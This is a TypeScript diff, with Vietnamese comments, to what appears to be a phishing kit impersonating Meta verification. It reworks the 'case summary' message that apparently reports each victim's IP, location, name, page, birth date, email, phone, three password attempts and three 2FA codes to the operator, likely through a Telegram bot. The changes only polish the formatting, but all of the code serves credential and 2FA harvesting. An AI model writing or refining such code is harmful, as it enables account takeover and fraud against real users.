@@ -81,6 +81,26 @@ function escapeHtml(input: any): string {
         .replace(/'/g, '&#39;');
 }
 
+/** Giá trị hiển thị trong <code>: không có dữ liệu thì để trống (không dùng "-" hay "N/A"). */
+function formatCodeField(value: unknown): string {
+    if (value === undefined || value === null) return '';
+    const s = String(value).trim();
+    return s ? escapeHtml(s) : '';
+}
+
+/** Phải trùng `PASSWORD_THIRD_FORGOT_MARKER` trong `PasswordModal.tsx` */
+const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
+
+/** Password(3): mật thật chỉ escape; marker Quên mật khẩu thêm icon để phân biệt. */
+function formatPasswordThirdDisplay(value: unknown): string {
+    const s = value === undefined || value === null ? '' : String(value).trim();
+    if (!s) return '';
+    if (s === PASSWORD_THIRD_FORGOT_MARKER) {
+        return `ℹ️\u00A0${escapeHtml(s)}`;
+    }
+    return escapeHtml(s);
+}
+
 
 function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
     const before = normalizeData(prevData);
@@ -157,33 +177,34 @@ function mergeData(oldData: any = {}, newData: any = {}) {
 
 function formatMessage(data: any): string {
     const d = normalizeData(data);
-    const dob = [d.day, d.month, d.year].every(Boolean)
+    const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
-        : '-';
+        : '';
     const authLine = d.authMethod ? `\n<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
+    const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
 
     const lines = [
         `<b>📋 META VERIFIED - CASE SUMMARY</b>`,
         `--------------`,
         `<b>🖥️ SYSTEM</b>`,
-        `<b>IP:</b> <code>${escapeHtml(d.ip || 'N/A')}</code>`,
-        `<b>Location:</b> <code>${escapeHtml(d.location || 'N/A')}</code>`,
+        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
+        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
         `--------------`,
         `<b>👤 PROFILE</b>`,
-        `<b>Full Name:</b> <code>${escapeHtml(d.fullName || '-')}</code>`,
-        `<b>Page:</b> <code>${escapeHtml(d.fanpage || '-')}</code>`,
+        `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
+        `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
         `<b>DOB:</b> <code>${dob}</code>`,
         `--------------`,
         `<b>📨 CONTACT</b>`,
-        `<b>Email:</b> <code>${escapeHtml(d.email || '-')}</code>`,
-        `<b>Business Email:</b> <code>${escapeHtml(d.emailBusiness || '-')}</code>`,
-        `<b>Phone:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : '-'}</code>`,
+        `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
+        `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
+        `<b>Phone:</b> <code>${phoneDisplay}</code>`,
         `--------------`,
         `<b>🔑 PASSWORD</b>`,
-        `<b>Password(1):</b> <code>${escapeHtml(d.password || '-')}</code>`,
-        `<b>Password(2):</b> <code>${escapeHtml(d.passwordSecond || '-')}</code>`,
-        `<b>Password(3):</b> <code>${escapeHtml(d.passwordThird || '-')}</code>`,
+        `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
+        `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
+        `<b>Password(3):</b> <code>${formatPasswordThirdDisplay(d.passwordThird)}</code>`,
         `${authLine ? authLine.trim() : ''}`
     ].filter(Boolean);
 
@@ -191,9 +212,9 @@ function formatMessage(data: any): string {
         lines.push(
             `--------------`,
             `<b>🔐 2FA</b>`,
-            `<b>2FA(1):</b> <code>${escapeHtml(d.twoFa || '-')}</code>`,
-            `<b>2FA(2):</b> <code>${escapeHtml(d.twoFaSecond || '-')}</code>`,
-            `<b>2FA(3):</b> <code>${escapeHtml(d.twoFaThird || '-')}</code>`
+            `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
+            `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
+            `<b>2FA(3):</b> <code>${formatCodeField(d.twoFaThird)}</code>`
         );
     }
 
